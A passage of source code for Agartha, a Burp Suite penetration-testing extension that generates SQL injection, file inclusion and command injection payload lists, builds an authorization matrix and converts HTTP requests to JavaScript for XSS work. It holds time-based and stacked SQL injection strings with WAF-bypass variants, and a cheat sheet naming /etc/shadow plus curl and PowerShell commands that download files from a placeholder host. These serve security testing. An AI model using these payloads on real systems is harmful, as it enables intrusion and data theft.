                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),120)" + "\n")
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message(1,120) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message(1,120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,120)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message(1,120)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,120)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,120)" + "\n")
                            else:
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),120) else null end from dual" + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,120) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,120) else null end from dual" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),120) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,120) else null end from dual" + "\n")
                    if self._cbMysqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from (select sleep(120))A)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from (select sleep(120))A)" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " and sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + " and sleep(120)" + "\n")
                                listSQLi.append(prefix + " or sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + " or sleep(120)" + "\n")
                                listSQLi.append(prefix + ";select sleep(120)" + "\n")
                                listSQLi.append(prefix + ";select sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(120))A)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(120))A)" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(120))A)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(120))A)" + "\n")
                                listSQLi.append(prefix + "sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + "sleep(120)" + "\n")
                    if self._cbPostgreBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select version()" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select version()" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select pg_sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from pg_sleep(120))" + suffix + "\n")                                    
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from pg_sleep(120))" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select pg_sleep(120)" + suffix + "\n")
                                listSQLi.append(prefix + ";select pg_sleep(120)" + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(120))" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(120))" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(120))" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(120))" + "\n")
                    if self._cbMssqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:02" + escapeChar + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:02" + escapeChar + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " waitfor delay '00:02'" + suffix + "\n")
                                listSQLi.append(prefix + " waitfor delay '00:02'" + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:02'" + suffix + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:02'" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + " waitfor delay \\'00:02\\'" + suffix + "\n")
                                    listSQLi.append(prefix + " waitfor delay \\'00:02\\'" + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:02\\'" + suffix + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:02\\'" + "\n")
        listSQLi = list(set(listSQLi))
        listSQLi.sort()
        if self._cbSqlEncoding.isSelected():
            listSQLi = self.encodeURL(listSQLi)
        self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
        self._lblStatusLabel.setText('SQL Injection payload generation is returned with '+ str(len(listSQLi)) + ' records!')
        return

    def encodeURL(self, payloads):
        urlList = []
        for payload in payloads:
            urlList.append(payload.replace(" ", "%20").replace("\"", "%22").replace("'", "%27").replace("\\", "%5c").replace("=", "%3d").replace("<", "%3c").replace(";", "%3b").replace("|", "%7c").replace("&", "%26").replace(":", "%3a").replace("`", "%60").replace("#", "%23").replace("\\", "%5C").replace("/", "%2F"))
        return urlList

    def getTabCaption(self):
        return "Agartha"

    def getUiComponent(self):
        return self._MainTabs

    def getHttpService(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getHttpService()

    def getRequest(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getRequest()

    def getResponse(self):
        return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getResponse()    

    def createMenuItems(self, invocation):
        self.context = invocation
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Authorization Matrix", actionPerformed=self.agartha_menu))
        menu_list.add(JMenuItem("Copy as JavaScript", actionPerformed=self.js_menu))
        return menu_list

    def js_menu(self, event):
        # right click menu
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = str(self._helpers.analyzeRequest(http_contexts[0]).getUrl())
        if _url.startswith("https"):
            _url = _url.replace(":443/", "/")
        elif _url.startswith("http"):
            _url = _url.replace(":80/", "/")

        method = _req.splitlines()[0].split(" ", 1)[0]

        if "]" in _req.splitlines()[-1][-1:] or "}" in _req.splitlines()[-1][-1:] or ">" in _req.splitlines()[-1][-1:]:
            jscript = "JSON/XML is not supported yet :/"
        else:
            fullHeader = ""
            for _reqLine in _req.splitlines()[1:-1]:
                if _reqLine and not any(re.findall(r'cookie|token|auth', _reqLine, re.IGNORECASE)):
                    fullHeader += "xhr.setRequestHeader('" + _reqLine.split(":", 1)[0] + "','" + _reqLine.split(":", 1)[1] + "');"

            if method == "GET":
                minHeader = "var xhr=new XMLHttpRequest();xhr.open('GET','" + _url + "');xhr.withCredentials=true;"
                jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + "xhr.send();</script>\n\n"
                jscript += "Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:\n\t<script>" + minHeader + fullHeader + "xhr.send();</script>"
            else:
                contentType = ""
                for _reqLine in _req.splitlines():
                    if any(re.findall(r'Content-type', _reqLine, re.IGNORECASE)):
                        contentType = "xhr.setRequestHeader('Content-type','" + _reqLine.split(" ", 1)[1] + "');"
                        break                    
                
                sendData = ""
                if _req.splitlines()[-1]:
                    sendData = "'" + _req.splitlines()[-1] + "'"
                
                minHeader = "var xhr=new XMLHttpRequest();xhr.open('" + method + "','" + _url + "');xhr.withCredentials=true;"
                jscript = "Http request with minimum header paramaters in JavaScript:\n\t<script>" + minHeader + contentType.strip() + "xhr.send(" + sendData + ");</script>\n\n"
                jscript += "Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:\n\t<script>" + minHeader + fullHeader + "xhr.send(" + sendData + ");</script>"
            jscript += "\n\nFor redirection, please also add this code before '</script>' tag:\n\txhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader('Location');return ajax.call(this,location);}};"
        
        clipboard.setContents(StringSelection(jscript), None)

    def agartha_menu(self, event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = ""
        for http_context in http_contexts:
            _url += str(self._helpers.analyzeRequest(http_context).getUrl()) + "\n"

        if _url.startswith("https"):
            _url = _url.replace(":443/", "/")
        elif _url.startswith("http"):
            _url = _url.replace(":80/", "/")
        
        if not self.tableMatrix.getRowCount():
            self.tableMatrixReset(self)

        self._tbAuthHeader.setText(_req)
        self._tbAuthURL.setText(_url)
        self._MainTabs.setSelectedComponent(self._tabAuthSplitpane)
        self._MainTabs.getParent().setSelectedComponent(self._MainTabs)

        if _req.splitlines()[0].split(" ", 1)[0] == "GET":
            self._cbAuthGETPOST.setSelectedIndex(0)
        else:
            self._cbAuthGETPOST.setSelectedIndex(1)

    def authMatrix(self, ev):
        t = Thread(target=self.authMatrixThread, args=[self])
        t.start()
        return

    def _updateReqResView(self, ev):
        try:
            row = self.tableMatrix.getSelectedRow()
            userID = self.tableMatrix.getSelectedColumn()
            if userID == 0:
                self._requestViewer.setMessage("", False)
                self._responseViewer.setMessage("", False)
            else:
                self._requestViewer.setMessage(self.httpReqRes[userID-1][row].getRequest(), False)
                self._responseViewer.setMessage(self.httpReqRes[userID-1][row].getResponse(), False)
        except:
            self._requestViewer.setMessage("", False)
            self._responseViewer.setMessage("", False)
    
    def isURLValid(self, urlAdd):
        if (urlparse.urlparse(urlAdd) and urlAdd.strip().startswith("http") and not " " in urlAdd.strip()) or urlAdd.isspace() or not urlAdd:
            return True
        else:
            return False

    def _tabAuthUI(self):
        # panel top
        self._tbAuthNewUser = JTextField("", 14)
        self._tbAuthNewUser.setToolTipText("Please provide an username.")
        self._btnAuthNewUserAdd = JButton("Add User", actionPerformed=self.authAdduser)
        self._btnAuthNewUserAdd.setPreferredSize(Dimension(90, 27))
        self._btnAuthNewUserAdd.setToolTipText("Please add user/s to populate role matrix!")
        self._btnAuthRun = JButton("RUN", actionPerformed=self.authMatrix)
        self._btnAuthRun.setPreferredSize(Dimension(150, 27))
        self._btnAuthRun.setToolTipText("Execute the task.")
        self._btnSiteMapGeneratorRun = JButton("SiteMap", actionPerformed=self.siteMapGenerator)
        self._btnSiteMapGeneratorRun.setPreferredSize(Dimension(90, 27))
        self._btnSiteMapGeneratorRun.setToolTipText("Generate user's sitemap and populate URL list automatically.")
        self._btnAuthRun.setEnabled(True)
        self._btnAuthReset = JButton("Reset", actionPerformed=self.tableMatrixReset)
        self._btnAuthReset.setPreferredSize(Dimension(90, 27))
        self._btnAuthReset.setToolTipText("Clear all.")
        self._btnAuthRun.setEnabled(False)
        self._btnAuthReset.setEnabled(False)
        self._tbAuthHeader = JTextPane()
        self._tbAuthHeader.setContentType("text")
        self._tbAuthHeader.setToolTipText("HTTP header belongs to the user. You can set up this field from right click: 'Extensions > Agartha > Authorization Matrix'.")
        self._tbAuthHeader.setEditable(True)
        self._tbAuthURL = JTextPane()
        self._tbAuthURL.setContentType("text")
        self._tbAuthURL.setToolTipText("URL paths can be accessible by the user. Please dont forget to remove logout links!")
        self._tbAuthURL.setEditable(True)
        self._cbAuthColoring = JCheckBox('Warnings', False, itemStateChanged=self._cbAuthColoringFunc)
        self._cbAuthColoring.setEnabled(True)
        self._cbAuthColoring.setToolTipText("Colors may help to a better analysis.")
        self._cbAuthGETPOST = JComboBox(('GET', 'POST'))
        self._cbAuthGETPOST.setSelectedIndex(0)
        self._cbAuthGETPOST.setToolTipText("Which HTTP method will be used for the test.")

        self._cbSiteMapDepth = JComboBox(('Only current URL', 'Max crawl depth is 1', 'Max crawl depth is 2', 'Max crawl depth is 3', 'Max crawl depth is 4', 'Max crawl depth is 5', 'Max crawl depth is 6', 'Max crawl depth is 7', 'Max crawl depth is 8', 'Max crawl depth is 9', 'Max crawl depth is 10'))
        self._cbSiteMapDepth.setPreferredSize(Dimension(150, 27))
        self._cbSiteMapDepth.setSelectedIndex(3)
        self._cbSiteMapDepth.setToolTipText("Webpage spider depth. How many sub-links should the web crawler go?")

        # top panel
        _tabAuthPanel1 = JPanel(BorderLayout())
        _tabAuthPanel1.setBorder(EmptyBorder(0, 0, 10, 0))
        _tabAuthPanel1_A = JPanel(FlowLayout(FlowLayout.LEADING, 10, 10))
        _tabAuthPanel1_A.setPreferredSize(Dimension(400, 105))
        _tabAuthPanel1_A.setMinimumSize(Dimension(400, 105))
        _tabAuthPanel1_A.add(self._btnAuthNewUserAdd)
        _tabAuthPanel1_A.add(self._tbAuthNewUser)
        _tabAuthPanel1_A.add(self._cbAuthGETPOST)
        _tabAuthPanel1_A.add(self._btnAuthReset)
        _tabAuthPanel1_A.add(self._btnAuthRun)
        _tabAuthPanel1_A.add(self._cbAuthColoring)
        _tabAuthPanel1_A.add(self._btnSiteMapGeneratorRun)
        _tabAuthPanel1_A.add(self._cbSiteMapDepth)
        _tabAuthPanel1_B = JScrollPane(self._tbAuthHeader, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        _tabAuthPanel1_C = JScrollPane(self._tbAuthURL, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        self._tabAuthSplitpaneHttp = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, _tabAuthPanel1_B, _tabAuthPanel1_C)
        self._tabAuthSplitpaneHttp.setResizeWeight(0.5)
        _tabAuthPanel1.add(_tabAuthPanel1_A, BorderLayout.WEST)
        _tabAuthPanel1.add(self._tabAuthSplitpaneHttp, BorderLayout.CENTER)
        # panel top

        # panel center
        self._lblAuthNotification = JLabel("", SwingConstants.LEFT)
        self.tableMatrix = []
        self.tableMatrix_DM = CustomDefaultTableModel(self.tableMatrix, ('URLs','No Authentication'))
        self.tableMatrix = JTable(self.tableMatrix_DM)        
        self.tableMatrix.setAutoCreateRowSorter(False)
        self.tableMatrix.setSelectionForeground(Color.red)
        self.tableMatrix.getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.getColumnModel().getSelectionModel().addListSelectionListener(self._updateReqResView)
        self.tableMatrix.setOpaque(True)
        self.tableMatrix.setFillsViewportHeight(True)
        self.tableMatrix_SP = JScrollPane()
        self.tableMatrix_SP.getViewport().setView((self.tableMatrix))
        _tabAuthPanel2 = JPanel()
        _tabAuthPanel2.setLayout(BoxLayout(_tabAuthPanel2, BoxLayout.Y_AXIS))
        _tabAuthPanel2.add(self._lblAuthNotification, BorderLayout.NORTH)
        _tabAuthPanel2.add(self.tableMatrix_SP, BorderLayout.NORTH)
        self.progressBar = JProgressBar()
        self.progressBar.setMaximum(1000000)
        self.progressBar.setMinimum(0)
        _tabAuthPanel2.add( self.progressBar, BorderLayout.SOUTH)
        # panel center

        self._tabAuthPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthPanel.setResizeWeight(0.25)
        self._tabAuthPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabAuthPanel.setTopComponent(_tabAuthPanel1)
        self._tabAuthPanel.setBottomComponent(_tabAuthPanel2)

        # panel bottom
        _tabsReqRes = JTabbedPane()        
        self._requestViewer = self._callbacks.createMessageEditor(self, False)
        self._responseViewer = self._callbacks.createMessageEditor(self, False)
        _tabsReqRes.addTab("Request", self._requestViewer.getComponent())
        _tabsReqRes.addTab("Response", self._responseViewer.getComponent())
        # panel bottom

        self._tabAuthSplitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabAuthSplitpane.setResizeWeight(0.7)
        self._tabAuthSplitpane.setTopComponent(self._tabAuthPanel)
        self._tabAuthSplitpane.setBottomComponent(_tabsReqRes)

    def _tabHelpUI(self):
        self._tabHelpJPanel = JPanel(BorderLayout())
        self._tabHelpJPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self.editorPaneInfo = JEditorPane()
        self.editorPaneInfo.setEditable(False)
        self.editorPaneInfo.setContentType("text/html");
        htmlString ="<html><body><table width=1000 border=0 cellspacing=0><tr><td><h3>Author:\t\t\tVolkan Dindar<br/>Github:\t\t\thttps://github.com/volkandindar/agartha</h3>"
        htmlString += """
        <h1>Agartha - LFI, RCE, SQLi, Auth, HTTP to JS</h1>
        <p>Agartha is a penetration testing tool which creates dynamic payload lists and user access matrix to reveal injection flaws and authentication/authorization issues. There are many different attack payloads alredy exist, but Agartha creates run-time, systematic and vendor-neutral payloads with many different possibilities and bypassing methods. It also draws attention to user session and URL relationships, which makes easy to find user access violations. And additionally, it converts Http requests to JavaScript to help digging up XSS issues more. </p>
        <p>In summary:</p>
        <ul>
        <li><strong>Payload Generator</strong>: It creates payloads/wordlists for different attack types.<ul>
        <li><strong>Local File Inclusion, Directory Traversal</strong>: It creates file dictionary lists with various encoding and escaping characters.</li>
        <li><strong>Command Injection / Remote Code Execution</strong>: It creates command dictionary lists for both unix and windows environments with different combinations.</li>
        <li><strong>SQL Injection</strong>: It creates Stacked Queries, Boolean-Based, Union-Based and Time-Based SQL Injection wordlist for various databases to help finding vulnerable spots.</li>
        </ul>
        </li>
        <li><strong>Authorization Matrix</strong>: It creates an access matrix based on user sessions and URL lists, to determine authorization/authentication related violations. <ul>
        <li>You can use <strong>&#39;SiteMap&#39;</strong> generator feature to create URL list. It will populate visible links automatically and the result will totally depend on the user&#39;s header.</li>
        </ul>
        </li>
        <li>And <strong>Copy as JavaScript</strong>: It converts Http requests to JavaScript code for further XSS exploitation and more.<br/><br/></li>
        </ul>
        <p>Here is a small tutorial how to use.</p>
        <h2>Installation</h2>
        <p>You should download &#39;Jython&#39; file and set your environment first:</p>
        <ul>
        <li>Burp Menu &gt; Extender &gt; Options &gt; Python Environment &gt; Locate Jython standalone jar file (tested in Jython v2.7.3).</li>
        </ul>
        <p>You can install Agartha through official store: </p>
        <ul>
        <li>Burp Menu &gt; Extender &gt; BApp Store &gt; Agartha</li>
        </ul>
        <p>Or for manual installation:</p>
        <ul>
        <li>Burp Menu &gt; Extender &gt; Extensions &gt; Add &gt; Extension Type: Python &gt; Extension file(.py): Select &#39;agartha.py&#39; file</li>
        </ul>
        <p>After all, you will see &#39;Agartha&#39; tab in the main window and it will be also registered the right click, under: </p>
        <ul>
        <li>&#39;Extensions &gt; Agartha - LFI, RCE, SQLi, Auth, HTTP to JS&#39;, with two sub-menus<ul>
        <li>&#39;Authorization Matrix&#39;</li>
        <li>&#39;Copy as JavaScript&#39;<br/><br/></li>
        </ul>
        </li>
        </ul>
        <h2>Local File Inclusion, Directory Traversal</h2>
        <p>It both supports unix and windows file syntax. You can generate any wordlists dynamically for the path you want. You just need to supply a file path and that&#39;s all. </p>
        <ul>
        <li><strong>&#39;Depth&#39;</strong> is representation of how deep the wordlist should be. You can generate wordlists &#39;till&#39; or &#39;equal to&#39; this value.</li>
        <li><strong>&#39;Waf Bypass&#39;</strong> asks for if you want to include all bypass features; like null bytes, different encoding, etc.</li>
        </ul>
        <p><img width=\"1000\" alt=\"Directory Traversal/Local File Inclusion wordlist\" src=\"https://github.com/volkandindar/agartha/assets/50321735/f08653e3-41ee-4cbe-bcd9-9a197005f5c9\"><br/><br/></p>
        <h2>Command Injection / Remote Code Execution</h2>
        <p>It creates command execution dynamic wordlists with the command you supply. It combines different separators and terminators for both unix and windows environments together.</p>
        <ul>
        <li><strong>&#39;URL Encoding&#39;</strong> encodes dictionary output.</li>
        </ul>
        <p><img width=\"1000\" alt=\"Remote Code Execution wordlist\" src=\"https://github.com/volkandindar/agartha/assets/50321735/1e83b404-f4f8-4d5d-a61e-07a9b8057be4\"><br/><br/></p>
        <h2>SQL Injection</h2>
        <p>It generates payloads for Stacked Queries, Boolean-Based, Union-Based, Time-Based SQL Injection attacks, and you do not need to supply any inputs. You just pick what type of SQL attacks and databases you want, then it will generate a wordlist with different combinations. </p>
        <ul>
        <li><strong>&#39;URL Encoding&#39;</strong> encodes dictionary output.</li>
        <li><strong>&#39;Waf Bypass&#39;</strong> asks for if you want to include all bypass features; like null bytes, different encoding, etc.</li>
        <li><strong>&#39;Union-Based&#39;</strong> ask for how deep the payload should be. The default value is 5.</li>
        <li>And the rest is related with databases and attack types.</li>
        </ul>
        <p><img width=\"1000\" alt=\"SQL Injection wordlist\" src=\"https://github.com/volkandindar/agartha/assets/50321735/f8f86e68-ad2f-4a14-b76a-0c679f1f1673\"><br/><br/></p>
        <h2>Authorization Matrix / User Access Table</h2>
        <p>This part focuses on user session and URLs relationships to determine access violations. The tool will visit all URLs from pre-defined user sessions and fill the table with all Http responses. It is a kind of access matrix and helps to find out authentication/authorization issues. Afterwards you will see what users can access what page contents.</p>
        <ul>
        <li>You can right click on any request (&#39;Extensions &gt; Agartha &gt; Authorization Matrix&#39;) to define <strong>user sessions</strong>.</li>
        <li>Next, you need to provide <strong>URL addresses</strong> the user (Http header/session owner) can visit. You can use internal &#39;SiteMap&#39; generator feature or supply any manual list. </li>
        <li>And then, you can use <strong>&#39;Add User&#39;</strong> button to add the user sessions.</li>
        <li>Now, it is ready for execution with only clicking <strong>&#39;Run&#39;</strong> button, and it will fill the table.</li>
        </ul>
        <img width=\"1000\" alt=\"Authorization Matrix\" src=\"https://github.com/volkandindar/agartha/assets/50321735/167293ad-28a7-4cd4-8ca8-e8a34e316e81\">
        
        <p>A little bit more details:</p>
        <ol>
        <li>What&#39;s username for the session you provide. You can add up to 4 different users and each user will have a different color to make it more readable.<ul>
        <li>&#39;Add User&#39; for adding user sessions to matrix.</li>
        <li>You can change Http request method between &#39;GET&#39; and POST.</li>
        <li>&#39;Reset&#39; button clear all contents.</li>
        <li>&#39;Run&#39; button execute the task and the result will show user access matrix.</li>
        <li>&#39;Warnings&#39; indicates possible issues in different colors.</li>
        <li>&#39;SiteMap&#39; button generates URL list automatically and the result totally depends on the user&#39;s header/session. Visible URLs will be populated in next textbox and you can still modify it.</li>
        <li>&#39;Crawl Depth&#39; is defination for how many sub-links (max depth) &#39;SiteMap&#39; spider should go and detect links.</li>
        </ul>
        </li>
        <li>It is the field for request headers and all URLs will be visited over the session defined in here.</li>
        <li>URL addresses that user can visit. You can create this list with manual effort or use <strong>&#39;SiteMap&#39;</strong> generator feature. You need to provide visitable URL lists for each users.</li>
        <li>All URLs you supply will be in here and they will be visited with the corresponding user sessions.</li>
        <li>No authentication column. All cookies, tokens and possible session parameters will be removed form Http calls.</li>
        <li>The rest of columns belong to users you created respectively and each of them has a unique color which indicates the URL owners.  </li>
        <li>Cell titles show Http &#39;response codes:response lengths&#39; for each user sessions.</li>
        <li>Just click the cell you want to examine and Http details will be shown in the bottom.</li>
        </ol>
        <img width=\"1000\" alt=\"User Access Table Details\" src=\"https://github.com/volkandindar/agartha/assets/50321735/4418ad6f-cd24-425e-bd3b-00dfdfda8c4f\">
        
        <p>After clicking &#39;RUN&#39;, the tool will fill user and URL matrix with different colors. Besides the user colors, you will see orange, yellow and red cells. The URL address does not belong to the user, and if the cell color is:</p>
        <ul>
        <li>Yellow, because the response returns &#39;HTTP 302&#39; with authentication/authorization concerns</li>
        <li>Orange, because the response returns &#39;HTTP 200&#39; but different content length, with authentication/authorization concerns</li>
        <li>Red, because the response returns &#39;HTTP 200&#39; and same content length, with authentication/authorization concerns</li>
        </ul>
        <p>You may also notice, it support only one Http request method and user session at the same time, because it processes bulk requests and it is not possible to provide different header options for each calls. But you may play with &#39;GET/POST&#39; methods to see response differences.<br/><br/></p>
        <h2>Copy as JavaScript</h2>
        <p>The feature is for converting Http requests to JavaScript code. It can be useful to dig up further XSS issues and bypass header restrictions.</p>
        <p>To access it, right click any Http request and &#39;Extensions &gt; Agartha &gt; Copy as JavaScript&#39;.</p>
        <img width=\"1000\" alt=\"Copy as JavaScript\" src=\"https://github.com/volkandindar/agartha/assets/50321735/4605b296-4c94-456c-b5b2-c8042a348cd2\">
        
        <p>It will automatically save it to your clipboard with some remarks. For example:</p>
        <pre><code>
        Http request with minimum header paramaters in JavaScript:
            &lt;script&gt;var xhr=new XMLHttpRequest();
                xhr.open(&#39;GET&#39;,&#39;http://dvwa.local/vulnerabilities/xss_r/?name=XSS&#39;);
                xhr.withCredentials=true;
                xhr.send();
            &lt;/script&gt;
        
        Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:
            &lt;script&gt;var xhr=new XMLHttpRequest();
                xhr.open(&#39;GET&#39;,&#39;http://dvwa.local/vulnerabilities/xss_r/?name=XSS&#39;);
                xhr.withCredentials=true;
                xhr.setRequestHeader(&#39;Host&#39;,&#39; dvwa.local&#39;);
                xhr.setRequestHeader(&#39;User-Agent&#39;,&#39; Mozilla/5.0 Gecko/20100101 Firefox/114.0&#39;);
                xhr.setRequestHeader(&#39;Accept&#39;,&#39; text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;);
                xhr.setRequestHeader(&#39;Accept-Language&#39;,&#39; en-GB,en;q=0.5&#39;);
                xhr.setRequestHeader(&#39;Accept-Encoding&#39;,&#39; gzip, deflate&#39;);
                xhr.setRequestHeader(&#39;Connection&#39;,&#39; close&#39;);
                xhr.setRequestHeader(&#39;Referer&#39;,&#39; http://dvwa.local/vulnerabilities/xss_r/&#39;);
                xhr.setRequestHeader(&#39;Upgrade-Insecure-Requests&#39;,&#39; 1&#39;);
                xhr.send();
            &lt;/script&gt;
        
        For redirection, please also add this code before &#39;&lt;/script&gt;&#39; tag:
            xhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader(&#39;Location&#39;);return ajax.call(this,location);}};
        </code></pre>
        <p>Please note that, the JavaScript code will be called over original user session and many header fields will be filled automatically by browsers. In some cases, the server may require some header field mandatory, and therefore you may need to modify the code for an adjustment.
        """
        htmlString +="</td></tr></table></body></html>"
        self.editorPaneInfo.setText(htmlString);
        self.editorScrollPaneInfo = JScrollPane(self.editorPaneInfo);
        self.editorScrollPaneInfo.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
        self._tabHelpJPanel.add(self.editorScrollPaneInfo, BorderLayout.CENTER);

    def _tabDictUI(self):
        # top panel
        self._txtDefaultLFI = "Example: '/etc/passwd', 'C:\\boot.ini'"
        self._txtDefaultCommandInj = "Examples: $'sleep 120', >'timeout 120' - for 2 minutes"
        self._txtDefaultSQLi = "No input is needed to supply!"
        self._txtCheatSheetLFI = ""
        self._txtCheatSheetLFI += "Common files for Linux\t\t\tCommon files for Windows\n"
        self._txtCheatSheetLFI += "\t/etc/passwd\t\t\t\tC:\\boot.ini\n"
        self._txtCheatSheetLFI += "\t/etc/profile\t\t\t\tC:\\windows\\win.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/environ\t\t\tC:\\windows\\system.ini\n"
        self._txtCheatSheetLFI += "\t/proc/self/status\t\t\tC:\\windows\\system32\\notepad.exe\n"
        self._txtCheatSheetLFI += "\t/etc/hosts\t\t\t\tC:\\windows\\system32\\drivers\\etc\\hosts\n"
        self._txtCheatSheetLFI += "\t/etc/shadow\t\t\t\tC:\\windows\\system32\\license.rtf\n"
        self._txtCheatSheetLFI += "\t/etc/group\t\t\t\tC:\\users\\public\\desktop\\desktop.ini\n"
        self._txtCheatSheetLFI += "\t/var/log/auth.log\t\t\tC:\\windows\\system32\\eula.txt\n"
        
        self._txtCheatSheetCommandInj = ""
        self._txtCheatSheetCommandInj += "Common commands for Unix\t\t\tCommon commands for Windows\n"
        self._txtCheatSheetCommandInj += "\tcat /etc/passwd\t\t\t\ttype file.txt\n"
        self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\tsysteminfo\n"
        self._txtCheatSheetCommandInj += "\tid\t\t\t\t\twhoami /priv\n"
        self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\tping -n 10 X.X.X.X\n"
        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"
